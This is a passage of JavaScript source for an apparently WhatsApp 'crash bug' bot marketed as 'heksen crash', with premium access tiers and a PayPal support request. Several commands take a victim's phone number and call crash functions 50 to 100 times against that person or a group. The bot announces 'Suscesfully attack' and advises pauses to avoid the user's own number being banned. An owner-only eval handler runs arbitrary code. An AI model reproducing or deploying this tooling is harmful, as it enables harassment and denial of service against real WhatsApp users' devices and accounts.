> 沃 .delprem ➩ *number*
> 沃 .owner ➩ *—*


`
const image = 'https://raw.githubusercontent.com/xhclintohn/Music-Clips-Collection/main/heksen.jpg';
let buttons = [
     {buttonId: '.gacor', buttonText: {displayText: '🌸⃟༑⌁⃰𝐈𝐧𝐟𝐨 𝐁͢𝐮𝐠 𝐆𝐚͢𝐜𝐨𝐫ͮ͢ཀ͜͡😈'}, type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
//     gifPlayback: true,
     caption: teks,
     buttons: buttons,
     contextInfo: {
       forwardingScore: 999,
         isForwarded: true,
         forwardedNewsletterMessageInfo: {
           newsletterJid: "120363322461279856@newsletter",
             newsletterName: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡😈"
            }
        },
        footer: "🌸⃟༑⌁⃰𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚ͮ͢ཀ͜͡😈",
        viewOnce: true,
        headerType: 6
   }
   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })

   ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriná.mp3'), mimetype:'audio/mpeg', ptt: false, caption: teks }, {quoted: m})
 }
break

case 'buggacor': {
m.reply(`*𝐻𝐸𝐾𝑆𝐸𝑁 𝐶𝑅𝐴𝑆𝐻 𝑉𝟺.𝟶𝟻 𝐺𝐸𝑁 𝟷*`) 
const teks = `
❄ INFORMATION ❄*
*🐉 name :* heksen͢crash
*🐉 username :* ${pushname}
*🐉 version :* 𝑉𝟺.𝟶𝟻 𝐺𝐸𝑁 𝟷
*🐉 generation :* legal

*🌷 bug ➩ emoji 🌷*
> 沃 .😈 ➩ *number*
> 沃 .🤪 ➩ *number*
> 沃 .🎃 ➩ *number*
> 沃 .☠️ ➩ *number*
> 沃 .👻 ➩ *number*

*😈 own ➩ menu 😈*
> 沃 .addprem ➩ *number*
> 沃 .delprem ➩ *number*
> 沃 .owner ➩ *—*


`
const image = 'https://raw.githubusercontent.com/xhclintohn/Music-Clips-Collection/main/heksen.jpg';
let buttons = [
     {buttonId: '.gacor', buttonText: {displayText: '🌸⃟༑⌁⃰𝐈𝐧𝐟𝐨 𝐁͢𝐮𝐠͢ཀ͜͡😈'}, type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
//     gifPlayback: true,
     caption: teks,
     buttons: buttons,
     contextInfo: {
       forwardingScore: 999,
         isForwarded: true,
         forwardedNewsletterMessageInfo: {
           newsletterJid: "120363322461279856@newsletter",
             newsletterName: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡😈"
            }
        },
        footer: "🌸⃟༑⌁⃰𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚ͮ͢ཀ͜͡😈",
        viewOnce: true,
        headerType: 6
   }
   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })

   ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriná.mp3'), mimetype:'audio/mpeg', ptt: false, caption: teks }, {quoted: m})
 }
break

case 'bug-group': {
m.reply(`*😈 cici clyriné 😈*`) 
const teks = `
*⚠️ warning ⚠️*

*do not click the table button in private*

*click the table button below, but you must click it in an open WhatsApp group*
`
const image = 'https://raw.githubusercontent.com/xhclintohn/Music-Clips-Collection/main/heksen.jpg'; // ganti dengan URL image yang ingin dikirimkan
let buttons = [
     {buttonId: '.bug-gb', buttonText: {displayText: '🌸⃟༑⌁⃰𝐁͢𝐮𝐠 𝐆𝐫𝐨͢𝐮𝐩ͮ͢ཀ͜͡😈'}, type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
     caption: teks,
     buttons: buttons,
     headerType: 4
   }
   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })

   ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriná.mp3'), mimetype:'audio/mpeg', ptt: false, caption: teks }, {quoted: m})
 }
break

case 'ell':
case 'acot':
case 'mpas':
case 'acor':
case 'ya':
case 'a':
case 'anel':
case 'atim':
case 'emek': {
ciciimupreply(`
Hai get the script here

https://whatsapp.com/channel/0029VagJlnG6xCSU2tS1Vz19
`)
}
break

case 'ug':
case 'ontol':
case 'ama': 
case 'c':
case 'pen': {
ciciimupreply(`
Hai get the script here

https://whatsapp.com/channel/0029VagJlnG6xCSU2tS1Vz19`)
}
break

case 'bug-gb': {
if (!isPremium)
await ciciimup.sendMessage(m.chat, { react: { text: `🥱`, key: m.key }})
  for (let i = 0; i < 100; i++) {
   await CrashGroup(target)
  }
}
break

case 'gacor': {
m.reply(`
Wanna Support this project?

Paypal: xh_clinton@outlook.com`)
}
break

case 'xandro':
case 'xios':
case 'xiphone':
case 'ui-system': 
case 'crash':
case 'heksencrash': {
if (!isPremium) return ciciimupreply('</> premium access only </>')
await ciciimup.sendMessage(m.chat, { react: { text: `🥱`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_please use a 5 minute break when using this bug, so that your number does not get banned_
`) 
for (let i = 0; i < 50; i++) {
await cicitzy1(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriná.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'heksencrash':
case 'crash':
case 'bug':
case 'kontol-crash':
case 'momok-crash': {
if (!isPremium) return ciciimupreply('</> premium access only  </>')
await ciciimup.sendMessage(m.chat, { react: { text: `🥱`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_please use a 5 minute break when using this bug, so that your number does not get banned_
`) 
for (let i = 0; i < 70; i++) {
await cicitzy2(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriná.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case '😈':
case '🤪':
case '🎃':
case '☠️':
case '👻': {
if (!isPremium) return ciciimupreply('</> premium access required </>')
await ciciimup.sendMessage(m.chat, { react: { text: `🥱`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_please use a 5 minute break when using this bug, so that your number does not get banned_
`) 
for (let i = 0; i < 70; i++) {
await await CallFC(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriná.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'tesbug': {
if (!isPremium) return ciciimupreply('</> premium access required </>')
await ciciimup.sendMessage(m.chat, { react: { text: `🥱`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_please use a 5 minute break when using this bug, so that your number does not get banned_
`) 
for (let i = 0; i < 3; i++) {
await cicitzy2(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriná.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'addprem': case 'add-acces': {
if (!Access) return ciciimupreply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return ciciimupreply(`where is the number and how many days do you want? example : ${prefix + command} @tag|30d`)
    if (!hari) return ciciimupreply(`How many days?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return ciciimupreply('lol, the owner is free')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return ciciimupreply('Suscesfully add premium🐉')
    let data = await ciciimup.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('Suscesfully add premium🐉')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://raw.githubusercontent.com/xhclintohn/Music-Clips-Collection/main/heksen.jpg`,
                    sourceUrl: 'https://whatsapp.com/channel/0029VagJlnG6xCSU2tS1Vz19'
                }	
            }	
        };	
        return ciciimup.sendMessage(m.chat, contentText, { quoted: m })
    } else {		
         ciciimupreply("not found")
    }	
}
break

case 'owner': case 'own': {
ciciimupreply(`https://wa.me/254735342808

> 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 [Dev]`)
}
break

case 'delprem': case 'del-acces': {
if (!Access) return ciciimupreply(mess.owner)
    if (!args[0]) return ciciimupreply(`who do you want to ${command}? use number/tag, example : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return ciciimupreply("this is not a premium user")
    let data = await ciciimup.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./lib/database/premium.json', JSON.stringify(premium))		
        ciciimupreply('user has been removed')
    } else {	
        ciciimupreply("not found")
    }
}
break

case 'public': {
if (!isPremium) return ciciimupreply(" sorry you don't have access ")
ciciimup.public = true
ciciimupreply(`*successfully changed bot to public mode*`)
}
break

case 'self': {
if (!isPremium) return ciciimupreply(" sorry you don't have access ")
ciciimup.public = false
ciciimupreply(`*successfully changed bot to self mode*`)
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})